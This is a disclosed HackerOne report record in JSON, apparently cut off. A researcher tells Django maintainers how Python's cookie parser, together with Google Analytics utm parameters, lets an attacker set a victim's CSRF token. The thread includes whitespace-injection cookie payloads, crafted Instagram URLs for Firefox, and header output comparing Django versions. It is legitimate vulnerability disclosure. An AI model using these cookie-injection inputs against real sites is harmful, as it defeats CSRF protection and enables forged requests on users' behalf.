{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-09-26T19:29:10.830Z", 
    "voters": [
        "fransrosen", 
        "d1m0ck", 
        "hogarth45", 
        "stefanofinding", 
        "michiel", 
        "bobrov", 
        "harisec", 
        "hunter", 
        "cdl", 
        "reactors08", 
        "and 45 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 26647, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-09-26T19:11:44.454Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "CSRF protection bypass on any Django powered site via Google Analytics", 
    "is_member_of_team?": null, 
    "vote_count": 55, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-10-26T19:11:44.538Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-09-01T11:30:31.371Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-09-01T11:30:31.371Z", 
            "actor": {
                "username": "apollo13", 
                "url": "/apollo13", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi Sergey,\n\nthat seems like a really nice finding! I am currently on a conference with flaky WLAN, but I've forwarded it internally. We might need a bit of time for this, cause we need to communicate this to the Python team too and see what they think.", 
            "markdown_message": "<p>Hi Sergey,</p>\n\n<p>that seems like a really nice finding! I am currently on a conference with flaky WLAN, but I&#39;ve forwarded it internally. We might need a bit of time for this, cause we need to communicate this to the Python team too and see what they think.</p>\n", 
            "type": "Activities::Comment", 
            "id": 119774, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-09-02T20:58:27.243Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-09-02T20:58:27.243Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi Sergey,\n\nFirst off, thank you very much for a well researched, and clearly reported bug. I believe you're the first person to report a valid one through this program. I've looked this over, and I agree that there's a real bug here. As you mentioned, this is a bug in the core Python library, and this example of a practical exploit using Django is very helpful.\n\nI see that you haven't submitted this yet to the security@python.org alias - since it's fundamentally a Python bug, that's where we'll need to start with the fix. I'm on the response team there too, and would appreciate it if you could submit this bug report there (sorry to ask you to forward the report again). Python does have a bounty, and I'll make sure you're properly rewarded for this.\n\nDjango will probably make a security release with a workaround for the Python bug, but we'll need to coordinate with upstream Python to do that, and I expect the reward will come from the Python project.\n\nThank you for your hard work!\n-Paul", 
            "markdown_message": "<p>Hi Sergey,</p>\n\n<p>First off, thank you very much for a well researched, and clearly reported bug. I believe you&#39;re the first person to report a valid one through this program. I&#39;ve looked this over, and I agree that there&#39;s a real bug here. As you mentioned, this is a bug in the core Python library, and this example of a practical exploit using Django is very helpful.</p>\n\n<p>I see that you haven&#39;t submitted this yet to the <a title=\"security@python.org\" href=\"mailto:security@python.org\" rel=\"nofollow noopener noreferrer\">security@python.org</a> alias - since it&#39;s fundamentally a Python bug, that&#39;s where we&#39;ll need to start with the fix. I&#39;m on the response team there too, and would appreciate it if you could submit this bug report there (sorry to ask you to forward the report again). Python does have a bounty, and I&#39;ll make sure you&#39;re properly rewarded for this.</p>\n\n<p>Django will probably make a security release with a workaround for the Python bug, but we&#39;ll need to coordinate with upstream Python to do that, and I expect the reward will come from the Python project.</p>\n\n<p>Thank you for your hard work!<br>\n-Paul</p>\n", 
            "type": "Activities::Comment", 
            "id": 120260, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-09-17T17:12:27.615Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-09-17T17:12:27.615Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi Sergey,\n\nUpstream python applied this patch:\nhttps://hg.python.org/cpython/rev/270f61ec1157\n\nCan you confirm that this fixes the issue? From my reading of your bug report, I'm not sure it does.\n\nThe Django Project would like to continue to keep this issue private until we can also issue a security release with a workaround.\n\n-Paul", 
            "markdown_message": "<p>Hi Sergey,</p>\n\n<p>Upstream python applied this patch:<br>\n<a title=\"https://hg.python.org/cpython/rev/270f61ec1157\" href=\"/redirect?signature=aeeb7213a9f5b5a8207e4f99ad4272e48c9c18f2&amp;url=https%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2F270f61ec1157\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://hg.python.org/cpython/rev/270f61ec1157</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Can you confirm that this fixes the issue? From my reading of your bug report, I&#39;m not sure it does.</p>\n\n<p>The Django Project would like to continue to keep this issue private until we can also issue a security release with a workaround.</p>\n\n<p>-Paul</p>\n", 
            "type": "Activities::Comment", 
            "id": 128567, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-09-18T10:56:10.824Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-09-18T10:56:10.824Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Yes, this patch fixes a bug related to the characters  [ \\ ]. \n\nHowever, there are still other similar options, such as the use of white space characters without double quotes. \n\n    C = cookies.SimpleCookie()\n    C.load('__utmz=blah csrftoken=x')\n    C.load('__utmz=blah\\x09csrftoken=x')\n    C.load('__utmz=blah\\x0bcsrftoken=x')\n    C.load('__utmz=blah\\x0ccsrftoken=x') \n\nWith a real exploitation of course there are problems here, because: \n*   Internet Explorer replaces characters \\x09 \\x0b \\x0c on \"_\".\n\n*   Chrome does not set the cookie, if they contain characters \\x09 \\x0b \\x0c. \n\n*   Google Analytics replaces the space with %20 \n(but, nevertheless, the problem may arise in the other JS-scripts or in setting Cookie from Web server).\n\n\nBut Firefox supports all of these characters and that's a real example of another bypass CSRF protection: \n\n1.  Remove all cookie from http://instagram.com \n\n2.  Open the link using FireFox \nhttp://instagram.com/?utm_source=1&utm_medium=2&utm_campaign=3&utm_term=4&utm_content=5%09csrftoken=x#\n\n3.  Reload the page and make sure that csrftoken=x\n", 
            "markdown_message": "<p>Yes, this patch fixes a bug related to the characters  [ \\ ]. </p>\n\n<p>However, there are still other similar options, such as the use of white space characters without double quotes. </p>\n<pre class=\"highlight plaintext\"><code>C = cookies.SimpleCookie()\nC.load(&#39;__utmz=blah csrftoken=x&#39;)\nC.load(&#39;__utmz=blah\\x09csrftoken=x&#39;)\nC.load(&#39;__utmz=blah\\x0bcsrftoken=x&#39;)\nC.load(&#39;__utmz=blah\\x0ccsrftoken=x&#39;) \n</code></pre>\n<p>With a real exploitation of course there are problems here, because: </p>\n\n<ul>\n<li><p>Internet Explorer replaces characters \\x09 \\x0b \\x0c on &quot;_&quot;.</p></li>\n<li><p>Chrome does not set the cookie, if they contain characters \\x09 \\x0b \\x0c. </p></li>\n<li><p>Google Analytics replaces the space with %20 <br>\n(but, nevertheless, the problem may arise in the other JS-scripts or in setting Cookie from Web server).</p></li>\n</ul>\n\n<p>But Firefox supports all of these characters and that&#39;s a real example of another bypass CSRF protection: </p>\n\n<ol>\n<li><p>Remove all cookie from <a title=\"http://instagram.com\" href=\"/redirect?signature=eed26eb9f765fdf68e645da4ee3ed6438f447eb0&amp;url=http%3A%2F%2Finstagram.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://instagram.com</span><i class=\"icon-external-link\"></i></a> </p></li>\n<li><p>Open the link using FireFox <br>\n<a title=\"http://instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken=x\" href=\"/redirect?signature=7ca9fa2aab15c6cee0a67b01b68314595eed8160&amp;url=http%3A%2F%2Finstagram.com%2F%3Futm_source%3D1%26utm_medium%3D2%26utm_campaign%3D3%26utm_term%3D4%26utm_content%3D5%2509csrftoken%3Dx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken=x</span><i class=\"icon-external-link\"></i></a></p></li>\n<li><p>Reload the page and make sure that csrftoken=x</p></li>\n</ol>\n", 
            "type": "Activities::Comment", 
            "id": 129067, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-10-25T06:29:33.412Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-10-25T06:29:33.412Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi, \nany new info about this vuln?", 
            "markdown_message": "<p>Hi, <br>\nany new info about this vuln?</p>\n", 
            "type": "Activities::Comment", 
            "id": 148153, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-10-27T13:44:31.076Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-10-27T13:44:31.076Z", 
            "actor": {
                "username": "apollo13", 
                "url": "/apollo13", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi,\n\nwe are working on a patch and will include it during the next security release.  We will show you the diff once we are sufficiently happy with the patch.\n\nCheers,\nFlorian", 
            "markdown_message": "<p>Hi,</p>\n\n<p>we are working on a patch and will include it during the next security release.  We will show you the diff once we are sufficiently happy with the patch.</p>\n\n<p>Cheers,<br>\nFlorian</p>\n", 
            "type": "Activities::Comment", 
            "id": 148783, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-05-04T06:46:04.859Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-04T06:46:04.859Z", 
            "actor": {
                "url": "/django", 
                "profile": {
                    "name": "Django"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/023/70440d61685f1c05276b327d184d510c3221fa25_medium.png?1383736780"
                }
            }, 
            "team_handle": "django", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "bobrov", 
                "url": "/bobrov"
            }, 
            "message": "Thank you for your excellent, well researched report, and your patience waiting for the payment.", 
            "markdown_message": "<p>Thank you for your excellent, well researched report, and your patience waiting for the payment.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 400916, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bobrov", 
                "url": "/bobrov"
            }, 
            "created_at": "2015-05-04T06:50:24.803Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-04T06:50:24.803Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 400920, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-04T07:43:51.243Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-04T07:43:51.243Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 400945, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-07T11:06:30.129Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-07T11:06:30.129Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi, what about disclosure?\nAnd it can still be exploited for FireFox\nhttps://instagram.com/?utm_source=1&utm_medium=2&utm_campaign=3&utm_term=4&utm_content=5%09csrftoken%3dx", 
            "markdown_message": "<p>Hi, what about disclosure?<br>\nAnd it can still be exploited for FireFox<br>\n<a title=\"https://instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken%3dx\" href=\"/redirect?signature=3b6c723a933c223a70c34474a64122cd0831a72e&amp;url=https%3A%2F%2Finstagram.com%2F%3Futm_source%3D1%26utm_medium%3D2%26utm_campaign%3D3%26utm_term%3D4%26utm_content%3D5%2509csrftoken%253dx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://instagram.com/?utm_source=1&amp;utm_medium=2&amp;utm_campaign=3&amp;utm_term=4&amp;utm_content=5%09csrftoken%3dx</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 404138, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-07T12:36:44.766Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-07T12:36:44.766Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "If Firefox is still (or differently) vulnerable then we probably shouldn't it publicly just yet (regardless of the fact that you already did so in the twitter variant of the same bug). Is there an open upstream ticket about Firefox?", 
            "markdown_message": "<p>If Firefox is still (or differently) vulnerable then we probably shouldn&#39;t it publicly just yet (regardless of the fact that you already did so in the twitter variant of the same bug). Is there an open upstream ticket about Firefox?</p>\n", 
            "type": "Activities::Comment", 
            "id": 404189, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-07T12:37:13.399Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-07T12:37:13.399Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugReopened", 
            "id": 404190, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-07T14:17:44.102Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-07T14:17:44.102Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "I haven't reported this to FireFox, because I think, that this is Python/Django blank symbols processing issue.\n\n```python\n>>> import Cookie\n>>> C = Cookie.SimpleCookie()\n>>> C.load('__utmz=blah csrftoken=x')\n>>> C.load('__utmz=blah\\x09csrftoken=x')\n>>> C.load('__utmz=blah\\x0bcsrftoken=x')\n>>> C.load('__utmz=blah\\x0ccsrftoken=x')\n>>> C\n<SimpleCookie: __utmz='blah' csrftoken='x'>\n```", 
            "markdown_message": "<p>I haven&#39;t reported this to FireFox, because I think, that this is Python/Django blank symbols processing issue.</p>\n<pre class=\"highlight python\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"kn\">import</span> <span class=\"nn\">Cookie</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span> <span class=\"o\">=</span> <span class=\"n\">Cookie</span><span class=\"o\">.</span><span class=\"n\">SimpleCookie</span><span class=\"p\">()</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span><span class=\"o\">.</span><span class=\"n\">load</span><span class=\"p\">(</span><span class=\"s\">&#39;__utmz=blah csrftoken=x&#39;</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span><span class=\"o\">.</span><span class=\"n\">load</span><span class=\"p\">(</span><span class=\"s\">&#39;__utmz=blah</span><span class=\"se\">\\x09</span><span class=\"s\">csrftoken=x&#39;</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span><span class=\"o\">.</span><span class=\"n\">load</span><span class=\"p\">(</span><span class=\"s\">&#39;__utmz=blah</span><span class=\"se\">\\x0b</span><span class=\"s\">csrftoken=x&#39;</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span><span class=\"o\">.</span><span class=\"n\">load</span><span class=\"p\">(</span><span class=\"s\">&#39;__utmz=blah</span><span class=\"se\">\\x0c</span><span class=\"s\">csrftoken=x&#39;</span><span class=\"p\">)</span>\n<span class=\"o\">&gt;&gt;&gt;</span> <span class=\"n\">C</span>\n<span class=\"o\">&lt;</span><span class=\"n\">SimpleCookie</span><span class=\"p\">:</span> <span class=\"n\">__utmz</span><span class=\"o\">=</span><span class=\"s\">&#39;blah&#39;</span> <span class=\"n\">csrftoken</span><span class=\"o\">=</span><span class=\"s\">&#39;x&#39;</span><span class=\"o\">&gt;</span>\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 404261, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-05-07T17:03:16.368Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-05-07T17:03:16.368Z", 
            "actor": {
                "username": "paulm", 
                "url": "/paulm", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/390/df307c8fba4b575f77d6e7dc3657dde5a0c92106_medium.jpg?1400624650"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Yeah, it's a python issue. Is there an open bug for it? I know here were some followup problems associated with the python patch, but I'm not sure where that ended up.", 
            "markdown_message": "<p>Yeah, it&#39;s a python issue. Is there an open bug for it? I know here were some followup problems associated with the python patch, but I&#39;m not sure where that ended up.</p>\n", 
            "type": "Activities::Comment", 
            "id": 404380, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-02T18:14:52.940Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-02T18:14:52.940Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Hi Sergey, I can't reproduce the problem with the Instagram link you provided and Firefox 44. Are you able to?", 
            "markdown_message": "<p>Hi Sergey, I can&#39;t reproduce the problem with the Instagram link you provided and Firefox 44. Are you able to?</p>\n", 
            "type": "Activities::Comment", 
            "id": 781561, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-02T18:40:01.145Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-02T18:40:01.145Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "By the way, what do you think the correct behavior is for parsing the whitespace case? Following the \"lax parsing\" fix in Python, we've had a number of reports where invalid cookies set by third-parties causes all subsequent cookies not to be parsed which causes the Django session to be lost (or even prevents users from being able to login).\n\nhttps://bugs.python.org/issue25228\nhttps://code.djangoproject.com/ticket/26158", 
            "markdown_message": "<p>By the way, what do you think the correct behavior is for parsing the whitespace case? Following the &quot;lax parsing&quot; fix in Python, we&#39;ve had a number of reports where invalid cookies set by third-parties causes all subsequent cookies not to be parsed which causes the Django session to be lost (or even prevents users from being able to login).</p>\n\n<p><a title=\"https://bugs.python.org/issue25228\" href=\"/redirect?signature=7b74355beabe23d363974b916384dd4d2e576b92&amp;url=https%3A%2F%2Fbugs.python.org%2Fissue25228\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.python.org/issue25228</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://code.djangoproject.com/ticket/26158\" href=\"/redirect?signature=1fe1475501e13cde66c75bf5ce5e4c6bf704797d&amp;url=https%3A%2F%2Fcode.djangoproject.com%2Fticket%2F26158\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://code.djangoproject.com/ticket/26158</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 781606, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T18:13:05.821Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T18:13:05.821Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "If Django's cookie parsing is still problematic here, I think it should be fixed in Django 1.10 by https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452. We could consider backporting that patch to Django 1.9 and 1.8 if necessary. I'm not sure about the steps to reproduce -- I forget what I did earlier. Is an Instagram account required?", 
            "markdown_message": "<p>If Django&#39;s cookie parsing is still problematic here, I think it should be fixed in Django 1.10 by <a title=\"https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452\" href=\"/redirect?signature=9aae35820babf33fbcba914bc025542c14cf48ec&amp;url=https%3A%2F%2Fgithub.com%2Fdjango%2Fdjango%2Fcommit%2F93a135d111c2569d88d65a3f4ad9e6d9ad291452\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/django/django/commit/93a135d111c2569d88d65a3f4ad9e6d9ad291452</span><i class=\"icon-external-link\"></i></a>. We could consider backporting that patch to Django 1.9 and 1.8 if necessary. I&#39;m not sure about the steps to reproduce -- I forget what I did earlier. Is an Instagram account required?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1189197, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T19:35:02.937Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T19:35:02.937Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Yes, this patch looks correct. \nIt looks like instagram stopped using Google Analytics and currently is not vulnerable.", 
            "markdown_message": "<p>Yes, this patch looks correct. <br>\nIt looks like instagram stopped using Google Analytics and currently is not vulnerable.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1189416, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T20:00:33.278Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T20:00:33.278Z", 
            "actor": {
                "username": "timgraham", 
                "url": "/timgraham", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "Is it worth setting up a test site to confirm the issue still exists in older versions of Django (to confirm browsers  haven't changed behavior, I guess) and to confirm that Django 1.10 fixes it?", 
            "markdown_message": "<p>Is it worth setting up a test site to confirm the issue still exists in older versions of Django (to confirm browsers  haven&#39;t changed behavior, I guess) and to confirm that Django 1.10 fixes it?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1189479, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-12T20:32:44.026Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-12T20:32:44.026Z", 
            "actor": {
                "username": "bobrov", 
                "url": "/bobrov", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/205/23edda13a2312c012c4935004ad89d8b4709fcb6_medium.jpeg?1389674804"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "django", 
            "message": "I checked locally django 1.9 and django 1.10.\nDjango 1.9 (vulnerable)\n```\nCookie: test=test;csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=\";csrftoken=xxx;\nSet-Cookie:  csrftoken=0wimKaIH8G80FQIS4RTytZHTd4YG7NCF;\n\nCookie: test=test csrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0bcsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n\nCookie: test=test\\x0ccsrftoken=xxx;\nSet-Cookie:  csrftoken=xxx;\n```\n\nDjango 1.10 (not vulnerable)\n```\nCookie: test=test;csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=\";csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\n\nCookie: test=test csrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=DFuxUi1LLWPvRo4UGDpKN04fi7fLlKPazescjWpGUTiZ7UfNbKVN5rsq0F3viliq;\n\nCookie: test=test\\x0Bcsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=vNcLbQhSzhMBvoj4qB74ttCwq9JVwUvblWUSBynOFraVq0A7s899NYZXuCyIcRe8;\n\nCookie: test=test\\x0Ccsrftoken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;\nSet-Cookie:  csrftoken=X3WYa2flCaPfLmW64okiFlkcmnzzizbcaru78nLwyZnhASpwsu6x6j0ia5dwfzit;\n```", 
